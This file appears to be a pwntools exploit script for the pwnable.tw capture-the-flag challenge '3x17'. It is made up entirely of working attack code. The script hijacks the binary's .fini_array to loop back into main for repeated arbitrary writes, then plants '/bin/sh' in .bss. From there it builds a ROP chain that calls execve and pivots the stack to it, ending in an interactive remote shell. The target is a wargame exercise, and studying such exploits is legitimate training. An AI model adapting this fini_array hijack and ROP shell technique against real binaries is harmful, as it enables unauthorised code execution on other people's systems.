from pwn import *

elf = ELF("./3x17")

context.binary = elf
context.terminal = "kitty @ launch --location=vsplit --cwd=current".split()
context.log_level = 'debug'

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10105)
    else:
        if args.GDB:
            p = gdb.debug([elf.path], aslr=True, api=False, gdbscript="""
                b *0x401b6d
                """)
        else:
            p = process([elf.path])

    return p

def write_payload(p, address, data):
    for i in range(0, len(data), 24):
        chunk = data[i:i+24]
        real_addr = address + i

        p.sendafter(b"addr:", str(real_addr).encode())
        p.sendafter(b"data:", chunk)

def main():
    p = conn()

    # pwn it
    leave_ret = 0x0000000000401c4b # leave ; ret
    pop_rsp = 0x0000000000402ba9 # pop rsp ; ret
    pop_rsi = 0x0000000000406c30 # pop rsi ; ret
    pop_rdi = 0x0000000000401696 # pop rdi ; ret
    pop_rdx = 0x0000000000446e35 # pop rdx ; ret
    pop_rax = 0x000000000041e4af # pop rax ; ret
    syscall = 0x00000000004022b4 # syscall
    main = 0x0000000000401B6D

    fini_array = 0x004b40f0
    destructor_routine = 0x402960

    payload = p64(destructor_routine) 
    payload += p64(main)

    write_payload(p, fini_array, payload)
    
    target = elf.bss()

    write_payload(p, target, b"/bin/sh\x00".ljust(24, b"\x00"))

    target += 8
    
    payload = p64(pop_rdi)
    payload += p64(elf.bss())
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(pop_rdx)
    payload += p64(0)
    payload += p64(pop_rax)
    payload += p64(59)
    payload += p64(syscall)

    write_payload(p, target, payload)

    payload = p64(leave_ret)
    payload += p64(pop_rsp)
    payload += p64(target)

    write_payload(p, fini_array, payload)

    p.interactive()

if __name__ == '__main__':
    main()

